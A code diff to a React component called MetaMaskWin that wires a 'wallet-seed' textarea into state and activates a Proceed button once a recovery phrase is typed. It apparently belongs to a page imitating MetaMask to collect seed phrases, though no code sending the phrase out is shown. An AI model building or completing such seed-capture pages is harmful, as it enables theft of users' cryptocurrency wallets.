@@ -8,6 +8,7 @@ import { FaChevronDown } from "react-icons/fa";
 const MetaMaskWin = () => {
   const [show, setShow] = useState(false);
   const [loading, setLoading] = useState(false);
+  const [walletSeedInput, setWalletSeedInput] = useState("");
 
   const SpinLoader = () => {
     setLoading(true);
@@ -16,6 +17,10 @@ const MetaMaskWin = () => {
       setShow(!show);
     }, 2000);
   };
+
+  function handleChange(e) {
+    setWalletSeedInput(e.target.value);
+  }
 
   return (
     <Box>
@@ -58,10 +63,18 @@ const MetaMaskWin = () => {
                   <textarea
                     name="wallet-seed"
                     id="wallet-seed"
+                    value={walletSeedInput}
+                    onChange={handleChange}
                     placeholder="Separate each word with a single space"
                   ></textarea>
                 </div>
-                <button className="btn-proceed">Proceed</button>
+                <button
+                  className={`btn-proceed ${
+                    walletSeedInput.length > 0 ? "activeB" : ""
+                  }`}
+                >
+                  Proceed
+                </button>
               </div>
             </div>
           </div>
